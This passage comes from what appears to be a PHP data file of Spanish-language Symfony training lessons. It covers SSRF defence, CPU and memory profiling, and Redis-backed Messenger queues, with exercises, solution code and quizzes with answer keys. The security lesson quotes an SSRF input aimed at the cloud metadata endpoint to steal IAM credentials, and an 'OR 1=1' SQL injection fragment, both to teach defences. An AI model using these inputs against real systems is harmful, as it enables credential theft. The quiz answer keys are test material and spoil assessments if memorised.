                        '¿Tenemos cabeceras CSP, X-Frame-Options y X-Content-Type-Options configuradas a nivel de proxy inverso o middleware de Symfony?',
                        '¿Están los secretos de producción cifrados en Symfony Vault con libsodium o hay credenciales en texto plano en el historial de Git?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Consumir un webhook externo cuya URL es configurada libremente por el usuario en el panel de administración.',
                    'junior' => [
                        'approach' => 'Ejecuta directamente file_get_contents($url) o curl_init($url) porque "el usuario ya está autenticado y es de confianza".',
                        'flaws' => [
                            'Vulnerabilidad crítica SSRF: el usuario puede ingresar http://169.254.169.254/latest/meta-data/iam/security-credentials/ y robar las credenciales maestras de la nube.',
                            'El atacante puede escanear puertos de servicios internos en localhost (Redis en 6379, MySQL en 3306, Memcached en 11211).',
                            'Bloqueo síncrono del worker de PHP si la URL remota no responde o cuelga la conexión.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Aplica un validador estricto SafeHttpUrlValidator que inspecciona el esquema, resuelve el DNS y rechaza IPs en rangos privados y reservados (FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE). Realiza la petición asíncronamente con timeout de 3 segundos.',
                        'rationale' => [
                            'Inmunidad ante SSRF y protección del entorno cloud de la empresa.',
                            'Aislamiento de la infraestructura interna: ninguna petición saliente puede alcanzar redes locales.',
                            'Manejo determinista de errores con excepciones explícitas.',
                        ],
                        'trade_offs' => 'Requiere una consulta previa de resolución DNS que añade una pequeña latencia a la validación.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Implementación de SsrfProtectionValidator',
                    'objective' => 'Implementar la clase SsrfProtectionValidator que valide si una URL es segura para peticiones HTTP salientes, verificando formato, esquemas permitidos (http, https), extrayendo el host y bloqueando IPs en rangos privados, de bucle local o reservados.',
                    'instructions' => 'Completa SsrfProtectionValidator: implementa validateUrl(string $url): string. Valida que $url (tras trim) no sea vacía y cumpla filter_var($trimmed, FILTER_VALIDATE_URL); de lo contrario lanza InvalidArgumentException. Extrae el esquema y valida que sea "http" o "https" (insensible a mayúsculas); de lo contrario lanza InvalidArgumentException. Extrae el host con parse_url. Resuelve la IP con gethostbyname($host). Verifica que la IP no pertenezca a rangos privados ni reservados usando filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE), y que no sea "127.0.0.1" ni "::1". Si pertenece a rangos privados o reservados, lanza RuntimeException con mensaje descriptivo de bloqueo SSRF. Retorna la URL sanitizada.',
                    'filename' => 'SsrfProtectionValidator.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Security\\Defense;\n\nuse InvalidArgumentException;\nuse RuntimeException;\n\nclass SsrfProtectionValidator\n{\n    public function validateUrl(string \$url): string\n    {\n        // TODO: Validar que la URL (tras trim) no sea vacía y tenga formato válido (InvalidArgumentException)\n        // TODO: Validar que el esquema sea 'http' o 'https' (InvalidArgumentException)\n        // TODO: Extraer el host y resolver la dirección IP mediante gethostbyname()\n        // TODO: Verificar si la IP es privada o reservada (FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)\n        // TODO: Si es privada, reservada o loopback (127.0.0.1, ::1), lanzar RuntimeException\n        // TODO: Retornar la URL limpia\n        return '';\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Security\\Defense;\n\nuse InvalidArgumentException;\nuse RuntimeException;\n\nclass SsrfProtectionValidator\n{\n    public function validateUrl(string \$url): string\n    {\n        \$cleanUrl = trim(\$url);\n        if (\$cleanUrl === '' || !filter_var(\$cleanUrl, FILTER_VALIDATE_URL)) {\n            throw new InvalidArgumentException('La URL proporcionada no es válida.');\n        }\n\n        \$scheme = strtolower((string) parse_url(\$cleanUrl, PHP_URL_SCHEME));\n        if (\$scheme !== 'http' && \$scheme !== 'https') {\n            throw new InvalidArgumentException('Solo se permiten los esquemas HTTP y HTTPS.');\n        }\n\n        \$host = parse_url(\$cleanUrl, PHP_URL_HOST);\n        if (!is_string(\$host) || \$host === '') {\n            throw new InvalidArgumentException('No se pudo extraer el host de la URL.');\n        }\n\n        \$ip = gethostbyname(\$host);\n\n        \$isPublic = filter_var(\n            \$ip,\n            FILTER_VALIDATE_IP,\n            FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE\n        );\n\n        if (\$isPublic === false || \$ip === '127.0.0.1' || \$ip === '::1') {\n            throw new RuntimeException(sprintf('Bloqueo SSRF: El host \"%s\" resuelve a una IP interna o reservada (%s).', \$host, \$ip));\n        }\n\n        return \$cleanUrl;\n    }\n}\n",
                    'explanation' => 'El ataque SSRF permite a un adversario usar el servidor web como proxy para acceder a recursos internos de la red corporativa o al servicio de metadatos en la nube (169.254.169.254). Validar el esquema, resolver el DNS y descartar IPs en rangos privados antes de realizar la conexión HTTP neutraliza de raíz esta vulnerabilidad crítica del OWASP Top 10.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Mitigación Activa de OWASP Top 10',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Por qué la dirección IP 169.254.169.254 es un objetivo primordial para atacantes en vulnerabilidades SSRF en entornos cloud (AWS, GCP, Azure)?',
                            'options' => [
                                'a' => 'Porque es la dirección que apaga los servidores físicos del centro de datos.',
                                'b' => 'Porque aloja el servicio de metadatos de la instancia (IMDS), a través del cual un atacante puede extraer tokens de seguridad temporales y credenciales de roles IAM si las peticiones no están filtradas.',
                                'c' => 'Porque es la IP del DNS raíz de Internet.',
                                'd' => 'Porque contiene las copias de seguridad de MySQL de toda la nube.',
                            ],
                            'correct' => 'b',
                            'explanation' => '169.254.169.254 es una IP de enlace local (link-local) que los proveedores cloud usan para servir metadatos de la máquina virtual. Sin protección SSRF, una petición del servidor a esa IP expone tokens temporales de IAM que permiten comprometer toda la cuenta en la nube.',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Por qué las funciones caseras de escape como addslashes() o expresiones regulares son insuficientes para prevenir SQL Injection frente a Prepared Statements?',
                            'options' => [
                                'a' => 'Porque addslashes() ralentiza la base de datos un 90%.',
                                'b' => 'Porque no previenen ataques basados en juegos de caracteres multibyte (como GBK o Big5) ni inyecciones numéricas donde no se usan comillas; en cambio, los Prepared Statements compilan el árbol sintáctico en el motor antes de ligar los parámetros de forma atómica.',
                                'c' => 'Porque addslashes() solo funciona en PHP 5.',
                                'd' => 'Porque MySQL rechaza consultas que usen barras invertidas.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Escapar strings es falible ante conjuntos de caracteres donde ciertos bytes consumen la barra invertida y en cláusulas numéricas sin comillas (WHERE id = 1 OR 1=1). Los Prepared Statements garantizan que los datos nunca sean interpretados como comandos SQL.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Cómo erradica una política de Content Security Policy (CSP) con Nonces criptográficos los ataques de Cross-Site Scripting (XSS)?',
                            'options' => [
                                'a' => 'Bloquea el acceso a Internet de todos los usuarios.',
                                'b' => 'Genera un token pseudoaleatorio único por cada Request HTTP (nonce); el navegador solo ejecuta bloques de script que contengan ese atributo nonce exacto, ignorando cualquier script inyectado por un atacante.',
                                'c' => 'Cifra el código HTML con clave AES-256 en el navegador.',
                                'd' => 'Desactiva completamente JavaScript en el navegador del cliente.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Con script-src \'nonce-xyz\', el navegador descarta cualquier etiqueta <script> inyectada maliciosamente porque el atacante no puede predecir el nonce criptográfico generado de forma exclusiva para esa respuesta HTTP específica.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 13: LECCIÓN 1: Profiling de Memoria & CPU en Symfony
            // ==========================================
            'perf-profiling-blackfire' => [
                'slug' => 'perf-profiling-blackfire',
                'title' => 'Profiling de Memoria & CPU en Symfony',
                'module' => 'Performance & Caching',
                'minutes' => 50,
                'difficulty' => 'Senior',
                'overview' => [
                    'concept' => 'El profiling determinista en PHP 8.4 no se basa en intuiciones o mediciones aisladas con microtime(), sino en el análisis riguroso de cuatro dimensiones: Wall Time (tiempo de reloj total), CPU Time (ciclos de cómputo efectivos consumidos por el proceso), I/O Wait (tiempo en reposo esperando red o disco) y Memory Peak (huella máxima de memoria asignada en el heap del motor Zend). Herramientas como Blackfire.io, Xhprof y el Symfony Web Profiler permiten construir grafos de llamadas (call graphs), identificar caminos críticos y aislar cuellos de botella algorítmicos.',
                    'problem' => 'El antipatrón de la "Optimización Prematura e Infundada": equipos de desarrollo reescribiendo código legible en bucles crípticos o introduciendo cachés de Redis complejas para problemas inexistentes, mientras ignoran que una sola llamada a Serializer::normalize() dentro de un bucle o la hidratación en memoria de 5,000 entidades Doctrine está consumiendo 128MB de RAM y 4 segundos de CPU por petición. Sin profiling científico, se optimiza lo trivial y se ignora lo catastrófico.',
                    'solution' => 'Metodología de Profiling Científico de 4 fases: 1) Línea base (Baseline) bajo carga idéntica en entorno controlado; 2) Descomposición del Call Graph identificando costos inclusivos y exclusivos de cada función; 3) Intervención Quirúrgica optimizando exclusivamente los nodos del camino crítico (como reemplazar hidratación de entidades por Doctrine DQL scalar arrays o activar OpCache Preloading); 4) Verificación Comparativa (Diff Assertion) en Blackfire garantizando que la mejora de tiempo no degrade la huella de memoria.',
                    'problem_label' => 'El Antipatrón de la Optimización Prematura y Cuellos de Botella Ocultos:',
                    'solution_label' => 'La Solución: Profiling Científico de 4 Dimensiones con Call Graphs:',
                ],
                'internals' => [
                    'title' => 'Dimensiones de Rendimiento en PHP 8.4 y Métricas de Profiling',
                    'steps' => [
                        [
                            'phase' => '1. Las 4 Dimensiones: Wall Time, CPU Time, I/O Wait y Memory Peak',
                            'description' => 'Una petición con alto Wall Time y bajo CPU Time indica bloqueo por base de datos o red externa (I/O Bound). Por el contrario, un alto CPU Time con bajo I/O Wait indica ineficiencia algorítmica, serializaciones redundantes o expresiones regulares costosas (CPU Bound).',
                        ],
                        [
                            'phase' => '2. Overhead de Hidratación en Doctrine ORM',
                            'description' => 'Instanciar miles de objetos PHP con proxies y seguimiento en el Unit of Work dispara el consumo de CPU y memoria. El uso de AbstractQuery::HYDRATE_ARRAY o DTOs con consultas escalares reduce la huella de memoria hasta en un 85% para vistas de solo lectura.',
                        ],
                        [
                            'phase' => '3. Profiling Automatizado y Assertions en CI/CD',
                            'description' => 'Blackfire Player permite definir aserciones en el pipeline de despliegue continuo (como metrics.symfony.events.count < 15 o main.peak_memory < 25MB) para evitar regresiones de rendimiento antes de llegar a producción.',
                        ],
                        [
                            'phase' => '4. Profiling de Memoria en Workers de Symfony Messenger',
                            'description' => 'En procesos de larga duración (CLI workers), las entidades acumuladas en el EntityManager provocan fugas de memoria progresivas (Memory Leaks). Invocar periódicamente $entityManager->clear() y gc_collect_cycles() mantiene la memoria constante.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/Performance/Profiling/ProfileSnapshotManager.php',
                    'title' => 'Gestor de Snapshots de Rendimiento de Alta Precisión en Nanosegundos',
                    'tag' => 'High Precision Profiling & Metrics',
                    'code' => "declare(strict_types=1);

namespace App\Performance\Profiling;

use RuntimeException;

class ProfileSnapshotManager
{
    /**
     * @var array<string, array{start_hrtime: int, start_memory: int}>
     */
    private array \$activeSnapshots = [];

    public function start(string \$label): void
    {
        \$cleanLabel = trim(\$label);
        if (\$cleanLabel === '') {
            throw new RuntimeException('La etiqueta del perfil no puede estar vacía.');
        }

        \$this->activeSnapshots[\$cleanLabel] = [
            'start_hrtime' => hrtime(true),
            'start_memory' => memory_get_usage(true),
        ];
    }

    /**
     * @return array{
     *     label: string,
     *     duration_ms: float,
     *     memory_delta_kb: float,
     *     peak_memory_mb: float,
     *     is_alert: bool
     * }
     */
    public function stop(string \$label, float \$thresholdMs = 100.0): array
    {
        \$cleanLabel = trim(\$label);
        if (!isset(\$this->activeSnapshots[\$cleanLabel])) {
            throw new RuntimeException(sprintf('No existe un snapshot activo con la etiqueta \"%s\".', \$cleanLabel));
        }

        \$snapshot = \$this->activeSnapshots[\$cleanLabel];
        unset(\$this->activeSnapshots[\$cleanLabel]);

        \$endHrtime = hrtime(true);
        \$endMemory = memory_get_usage(true);
        \$peakMemory = memory_get_peak_usage(true);

        \$durationNs = \$endHrtime - \$snapshot['start_hrtime'];
        \$durationMs = round(\$durationNs / 1_000_000.0, 4);
        \$memoryDeltaKb = round((\$endMemory - \$snapshot['start_memory']) / 1024.0, 2);
        \$peakMemoryMb = round(\$peakMemory / (1024.0 * 1024.0), 2);

        return [
            'label' => \$cleanLabel,
            'duration_ms' => \$durationMs,
            'memory_delta_kb' => \$memoryDeltaKb,
            'peak_memory_mb' => \$peakMemoryMb,
            'is_alert' => \$durationMs > \$thresholdMs,
        ];
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Para un Senior, "hacer el código más rápido" es una afirmación sin sentido sin métricas previas y posteriores. La primera ley del rendimiento: "Mide, no adivines". Un Senior utiliza perfiles de ejecución (call graphs) para encontrar el cuello de botella real en lugar de aplicar microoptimizaciones cosméticas. Sabe que reducir el consumo de memoria un 50% suele acelerar la ejecución más que reducir el tiempo de CPU, porque alivia la presión sobre el Garbage Collector de PHP.',
                    'critical_questions' => [
                        '¿Estamos midiendo tiempo de reloj (Wall Time) o tiempo real de procesador (CPU Time)?',
                        '¿Cuánta memoria está reteniendo el Unit of Work de Doctrine y cuándo fue la última vez que llamamos a clear()?',
                        '¿Estamos usando hrtime() en lugar de microtime() para mediciones precisas e inmunes a saltos de reloj NTP?',
                        '¿Nuestros perfiles en Blackfire muestran llamadas redundantes a eventos o serializadores dentro de bucles?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Un endpoint de exportación de catálogo tarda 4.5 segundos y agota los 128MB de memoria en producción.',
                    'junior' => [
                        'approach' => 'Aumenta el memory_limit en php.ini a 512MB y el max_execution_time a 120 segundos, asumiendo que "exportar datos pesados simplemente tarda".',
                        'flaws' => [
                            'Agota la RAM del servidor ante pocos usuarios concurrentes, provocando que el kernel mate procesos de PHP-FPM (OOM Killer).',
                            'Oculta el cuello de botella real en lugar de solucionarlo.',
                            'Empeora la experiencia de usuario y bloquea conexiones en el proxy inverso.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Ejecuta un profile con Blackfire, detecta que Doctrine está hidratando 10,000 entidades con todas sus relaciones, cambia la query a DQL escalar con AbstractQuery::HYDRATE_ARRAY o un Generator de PHP con Cursor, reduciendo el tiempo a 180ms y la memoria a 6MB.',
                        'rationale' => [
                            'Reducción del 95% en consumo de memoria sin tocar la configuración global de PHP.',
                            'Streaming de datos en bloques (chunking) que permite procesar catálogos infinitos con consumo de memoria plano O(1).',
                            'Escalabilidad predecible ante picos de tráfico concurrentes.',
                        ],
                        'trade_offs' => 'Las entidades no se gestionan en el Unit of Work, por lo que no se pueden modificar con persist/flush en la misma consulta.',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Temporizador de Alta Precisión con hrtime() y Métricas de Memoria',
                    'objective' => 'Implementar la clase ExecutionTimer que registre checkpoints de ejecución usando hrtime(true) y memory_get_usage(true), calculando duración en milisegundos y variación de memoria en bytes.',
                    'instructions' => 'Completa ExecutionTimer: implementa start(string $checkpoint): void. Valida que $checkpoint (tras trim) no sea vacío (InvalidArgumentException); guarda la marca de tiempo con hrtime(true) y la memoria inicial con memory_get_usage(true). Implementa stop(string $checkpoint): array: valida que el checkpoint exista en la lista activa (lanza RuntimeException si no fue iniciado); calcula la duración en milisegundos dividiendo ($nowNs - $startNs) entre 1000000.0 redondeado a 4 decimales; calcula el delta de memoria restando ($currentMemory - $startMemory); elimina el checkpoint de activos y retorna array con claves: checkpoint, duration_ms, memory_delta_bytes, peak_memory_bytes. Implementa reset(): void para limpiar checkpoints activos.',
                    'filename' => 'ExecutionTimer.php',
                    'starter_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Performance\\Profiling;\n\nuse InvalidArgumentException;\nuse RuntimeException;\n\nclass ExecutionTimer\n{\n    /**\n     * @var array<string, array{start_ns: int, start_bytes: int}>\n     */\n    private array \$timers = [];\n\n    public function start(string \$checkpoint): void\n    {\n        // TODO: Validar que \$checkpoint (tras trim) no sea vacía (InvalidArgumentException)\n        // TODO: Guardar en \$this->timers con start_ns = hrtime(true) y start_bytes = memory_get_usage(true)\n    }\n\n    /**\n     * @return array{checkpoint: string, duration_ms: float, memory_delta_bytes: int, peak_memory_bytes: int}\n     */\n    public function stop(string \$checkpoint): array\n    {\n        // TODO: Validar que exista en \$this->timers (de lo contrario lanzar RuntimeException)\n        // TODO: Calcular duration_ms = round((hrtime(true) - start_ns) / 1_000_000.0, 4)\n        // TODO: Calcular memory_delta_bytes = memory_get_usage(true) - start_bytes\n        // TODO: Obtener peak_memory_bytes = memory_get_peak_usage(true)\n        // TODO: Eliminar de \$this->timers y retornar array estructurado\n        return [];\n    }\n\n    public function reset(): void\n    {\n        \$this->timers = [];\n    }\n}\n",
                    'solution_code' => "<?php\n\ndeclare(strict_types=1);\n\nnamespace App\\Performance\\Profiling;\n\nuse InvalidArgumentException;\nuse RuntimeException;\n\nclass ExecutionTimer\n{\n    /**\n     * @var array<string, array{start_ns: int, start_bytes: int}>\n     */\n    private array \$timers = [];\n\n    public function start(string \$checkpoint): void\n    {\n        \$clean = trim(\$checkpoint);\n        if (\$clean === '') {\n            throw new InvalidArgumentException('El nombre del checkpoint no puede estar vacío.');\n        }\n\n        \$this->timers[\$clean] = [\n            'start_ns' => hrtime(true),\n            'start_bytes' => memory_get_usage(true),\n        ];\n    }\n\n    /**\n     * @return array{checkpoint: string, duration_ms: float, memory_delta_bytes: int, peak_memory_bytes: int}\n     */\n    public function stop(string \$checkpoint): array\n    {\n        \$clean = trim(\$checkpoint);\n        if (!isset(\$this->timers[\$clean])) {\n            throw new RuntimeException(sprintf('El checkpoint \"%s\" no ha sido iniciado.', \$clean));\n        }\n\n        \$timer = \$this->timers[\$clean];\n        unset(\$this->timers[\$clean]);\n\n        \$endNs = hrtime(true);\n        \$endBytes = memory_get_usage(true);\n        \$peakBytes = memory_get_peak_usage(true);\n\n        \$durationMs = round((\$endNs - \$timer['start_ns']) / 1_000_000.0, 4);\n        \$memoryDeltaBytes = \$endBytes - \$timer['start_bytes'];\n\n        return [\n            'checkpoint' => \$clean,\n            'duration_ms' => \$durationMs,\n            'memory_delta_bytes' => \$memoryDeltaBytes,\n            'peak_memory_bytes' => \$peakBytes,\n        ];\n    }\n\n    public function reset(): void\n    {\n        \$this->timers = [];\n    }\n}\n",
                    'explanation' => 'hrtime() proporciona un temporizador monotónico de alta resolución en nanosegundos que nunca retrocede, a diferencia de microtime() que es vulnerable a correcciones de reloj de red NTP. Junto con memory_get_usage(true) y memory_get_peak_usage(true), constituye la base técnica para construir instrumentos de profiling de nivel profesional.',
                ],
                'quiz' => [
                    'title' => 'Evaluación Técnica: Profiling de CPU & Memoria en PHP 8.4',
                    'questions' => [
                        [
                            'id' => 'q1',
                            'question' => '¿Cuál es la diferencia fundamental entre Wall Time y CPU Time en un perfil de rendimiento?',
                            'options' => [
                                'a' => 'Wall Time mide solo los días y CPU Time mide los segundos.',
                                'b' => 'Wall Time es el tiempo total de reloj transcurrido desde el inicio al fin del Request (incluyendo esperas de red y disco), mientras que CPU Time mide exclusivamente el tiempo que el procesador estuvo ejecutando código PHP.',
                                'c' => 'Son idénticos y siempre tienen el mismo valor numérico.',
                                'd' => 'Wall Time solo se puede medir en Docker.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Si Wall Time es alto pero CPU Time es muy bajo, el proceso pasa la mayor parte del tiempo bloqueado esperando respuestas de base de datos o llamadas HTTP (I/O Bound). Si ambos son altos, hay sobrecarga computacional en código PHP (CPU Bound).',
                        ],
                        [
                            'id' => 'q2',
                            'question' => '¿Por qué la hidratación de entidades completas en Doctrine ORM puede generar un cuello de botella severo de memoria en endpoints de consulta masiva?',
                            'options' => [
                                'a' => 'Porque Doctrine almacena cada entidad en disco duro.',
                                'b' => 'Porque por cada registro de base de datos, Doctrine instancia un objeto PHP, inicializa proxies y registra copias en el Unit of Work para seguimiento de cambios de estado (identity map), multiplicando la huella de memoria.',
                                'c' => 'Porque Doctrine desactiva el recolector de basura de PHP 8.4.',
                                'd' => 'Porque MySQL cobra licencia por cada entidad instanciada.',
                            ],
                            'correct' => 'b',
                            'explanation' => 'Para consultas de solo lectura, la hidratación completa de entidades desperdicia CPU y RAM en el Unit of Work. Utilizar DTOs o AbstractQuery::HYDRATE_ARRAY elimina el tracking y alivia drásticamente la memoria.',
                        ],
                        [
                            'id' => 'q3',
                            'question' => '¿Por qué hrtime() es superior a microtime() para medir duraciones de micro-benchmarks y profiling en PHP?',
                            'options' => [
                                'a' => 'Porque hrtime() devuelve un reloj monotónico que no puede ser alterado ni retrocedido por ajustes automáticos de la hora del sistema (como sincronizaciones NTP).',
                                'b' => 'Porque hrtime() comprime el código automáticamente.',
                                'c' => 'Porque microtime() solo funciona en sistemas Windows.',
                                'd' => 'Porque hrtime() guarda los resultados en Redis.',
                            ],
                            'correct' => 'a',
                            'explanation' => 'microtime() depende del reloj de pared del sistema operativo, que puede saltar hacia adelante o atrás con sincronizaciones NTP. hrtime() accede al reloj monotónico del hardware, garantizando monotonicidad y precisión en nanosegundos.',
                        ],
                    ],
                ],
            ],

            // ==========================================
            // NIVEL 13: LECCIÓN 2: Symfony Messenger & Redis Queues
            // ==========================================
            'perf-redis-caching-queues' => [
                'slug' => 'perf-redis-caching-queues',
                'title' => 'Symfony Messenger & Redis Queues',
                'module' => 'Performance & Caching',
                'minutes' => 55,
                'difficulty' => 'Senior',
                'overview' => [
                    'concept' => 'La asincronía arquitectónica es el pilar para escalar aplicaciones Symfony a alta concurrencia. Symfony Messenger proporciona un bus de mensajes unificado que desacopla la recepción del comando de su procesamiento mediante colas durables respaldadas por Redis Streams. Al sustituir operaciones pesadas en el Request HTTP por el despacho de un mensaje inmutable hacia Redis, el tiempo de respuesta al cliente pasa de varios segundos a menos de 5 milisegundos.',
                    'problem' => 'El antipatrón del "Monolito Síncrono Bloqueante": el controlador HTTP asume toda la responsabilidad: recibe la orden, valida, inserta en MySQL, contacta la pasarela de pago externa vía cURL, genera un PDF pesado en memoria y envía un correo SMTP. Si la pasarela tarda 3 segundos o el servidor SMTP tiene congestión, la petición del cliente se bloquea, agota el pool de procesos de PHP-FPM y colapsa el sistema con errores 504 Gateway Timeout.',
                    'solution' => 'Arquitectura orientada a mensajes con Symfony Messenger y Redis Streams: 1) DTOs inmutables livianos que transportan solo identificadores (OrderId) en lugar de entidades completas; 2) Redis Streams con grupos de consumidores (consumer groups) y acuse de recibo explícito (XACK); 3) Idempotencia en handlers mediante claves de deduplicación; 4) Estrategia de reintentos exponenciales con cola de mensajes muertos (Dead Letter Queue / failed).',
                    'problem_label' => 'El Antipatrón del Bloqueo Síncrono en Controladores:',
                    'solution_label' => 'La Solución: Symfony Messenger Asíncrono con Redis Streams:',
                ],
                'internals' => [
                    'title' => 'Mecanismos Internos del MessageBus y Redis Streams',
                    'steps' => [
                        [
                            'phase' => '1. Pipeline de Middlewares en Symfony Messenger',
                            'description' => 'Cada mensaje despachado atraviesa una cadena de middlewares configurables: AddBusNameStampMiddleware, ValidationMiddleware, DoctrineTransactionMiddleware (que envuelve la ejecución en una transacción DB automática) y SendFailedMessageToFailureTransportMiddleware.',
                        ],
                        [
                            'phase' => '2. Redis Streams: Grupos de Consumidores y XACK',
                            'description' => 'Symfony utiliza los comandos XADD, XREADGROUP y XACK de Redis Streams. A diferencia de listas simples (LPUSH/RPOP), los streams retienen los mensajes en una lista de pendientes (Pending Entries List o PEL) hasta que el worker confirma su procesamiento exitoso mediante XACK, evitando la pérdida de mensajes si el worker colapsa.',
                        ],
                        [
                            'phase' => '3. Idempotencia y Deduplicación en Handlers',
                            'description' => 'En sistemas distribuidos, la entrega de mensajes garantiza "al menos una vez" (at-least-once delivery). Un Senior implementa idempotencia verificando si el identificador del mensaje ya fue procesado antes de mutar la base de datos o emitir pagos.',
                        ],
                        [
                            'phase' => '4. Estrategia de Reintentos Exponenciales y Dead Letter Queue (DLQ)',
                            'description' => 'Los fallos temporales (como indisponibilidad de una API externa) se gestionan con reintentos exponenciales (multiplier: 2, max_retries: 3). Tras agotar los reintentos, el mensaje se redirige automáticamente al transporte "failed" para inspección forense sin bloquear la cola principal.',
                        ],
                    ],
                ],
                'architecture_code' => [
                    'filename' => 'src/Performance/Queue/AsyncOrderProcessingHandler.php',
                    'title' => 'Handler Asíncrono Idempotente de Symfony Messenger con Redis Streams',
                    'tag' => 'Symfony Messenger & Idempotent Handler',
                    'code' => "declare(strict_types=1);

namespace App\Performance\Queue;

use Symfony\Component\Messenger\Attribute\AsMessageHandler;
use Symfony\Component\Messenger\Stamp\ReceivedStamp;
use Symfony\Component\Messenger\Envelope;
use RuntimeException;

readonly class ProcessOrderMessage
{
    public function __construct(
        public string \$orderId,
        public int \$userId,
        public float \$amount
    ) {}
}

#[AsMessageHandler]
class AsyncOrderProcessingHandler
{
    /**
     * @var array<string, bool> Simulación de almacenamiento Redis para deduplicación
     */
    private array \$processedLedger = [];

    public function __invoke(ProcessOrderMessage \$message, ?Envelope \$envelope = null): void
    {
        \$idempotencyKey = 'order:processed:' . \$message->orderId;

        // Verificación estricta de idempotencia
        if (isset(\$this->processedLedger[\$idempotencyKey])) {
            // El mensaje ya fue procesado previamente; se descarta silenciosamente para evitar cobros dobles
            return;
        }

        // Validación de invariantes de negocio
        if (\$message->amount <= 0.0) {
            throw new RuntimeException(sprintf('Monto inválido %f para la orden %s.', \$message->amount, \$message->orderId));
        }

        // Procesamiento de la orden (ejecución de pasarela de pagos / inventario)
        \$this->executeTransaction(\$message);

        // Registro de la clave de idempotencia
        \$this->processedLedger[\$idempotencyKey] = true;
    }

    private function executeTransaction(ProcessOrderMessage \$message): void
    {
        // Operación atómica de negocio
    }
}",
                ],
                'senior_mindset' => [
                    'thought_process' => 'Un Senior sabe que la mejor manera de acelerar una petición HTTP es no hacer el trabajo en esa petición. La regla sagrada: "Persiste el evento y responde inmediatamente con HTTP 202 Accepted". Diseña mensajes que contengan referencias de identidad (UUIDs o IDs) en lugar de grafos de entidades serializadas, y asume que cualquier consumidor asíncrono puede fallar o ejecutarse más de una vez, haciendo obligatoria la idempotencia en cada Handler.',
                    'critical_questions' => [
                        '¿Estamos enviando sólo IDs de dominio en los mensajes en lugar de entidades Doctrine completas serializadas?',
                        '¿Es el Message Handler completamente idempotente ante mensajes duplicados o reentregas de red?',
                        '¿Tenemos una cola de mensajes fallidos (Dead Letter Queue) configurada y alertas sobre su crecimiento?',
                        '¿Qué límites de memoria y tiempo de vida tienen los workers de consola para evitar memory leaks?',
                    ],
                ],
                'junior_vs_senior' => [
                    'problem_statement' => 'Procesar el cobro y facturación de 2,000 pedidos durante una campaña de descuentos flash.',
                    'junior' => [
                        'approach' => 'Ejecuta el cobro con la API externa de pagos y genera el PDF de factura dentro del controlador HTTP en la misma petición del checkout.',
                        'flaws' => [
                            'La latencia de la pasarela de pagos (2 a 4 segundos) agota todos los workers de PHP-FPM con solo 50 usuarios concurrentes.',
                            'Si la pasarela falla o da timeout, el usuario reintenta y se produce un cobro duplicado.',
                            'Caída total de la tienda con errores 504 Gateway Timeout.',
                        ],
                    ],
                    'senior' => [
                        'approach' => 'Registra la orden en MySQL en estado "pending", despacha un comando ProcessOrderCommand al bus de Symfony Messenger respaldado por Redis Streams y responde HTTP 202 Accepted en 4ms. Workers dedicados procesan los cobros con reintentos exponenciales e idempotencia estricta.',
                        'rationale' => [
                            'Checkout instantáneo y resiliente a fluctuaciones de latencia de terceros.',
                            'Cero riesgo de cobros dobles gracias a claves de idempotencia en Redis.',
                            'Aislamiento total: si la pasarela de pagos cae 10 minutos, las órdenes se acumulan seguras en Redis sin perder una sola venta.',
                        ],
                        'trade_offs' => 'Requiere supervisión de procesos de consola en producción (Supervisord/Kubernetes).',
                    ],
                ],
                'exercise' => [
                    'title' => 'Reto de Código: Implementación de IdempotentJobQueue',
                    'objective' => 'Implementar la clase IdempotentJobQueue para encolar y procesar trabajos asíncronos garantizando idempotencia estricta por identificador de trabajo (jobId), orden FIFO y registro histórico de ejecuciones.',
                    'instructions' => 'Completa IdempotentJobQueue: implementa enqueue(string $jobId, array $payload): bool. Valida que $jobId (tras trim) no sea vacío (InvalidArgumentException). Si el trabajo ya fue procesado ($this->isProcessed($cleanId)) o ya se encuentra en cola, retorna false para garantizar idempotencia. Si es nuevo, añade el trabajo a la cola interna y retorna true. Implementa processNext(Closure $processor): ?array: si la cola está vacía, retorna null; de lo contrario extrae el primer elemento en orden FIFO, ejecuta $processor($job[\'payload\']), marca el $jobId como procesado en la lista de completados y retorna array con: job_id, result, processed_at (microtime(true)). Implementa isProcessed(string $jobId): bool y clear(): void.',
                    'filename' => 'IdempotentJobQueue.php',
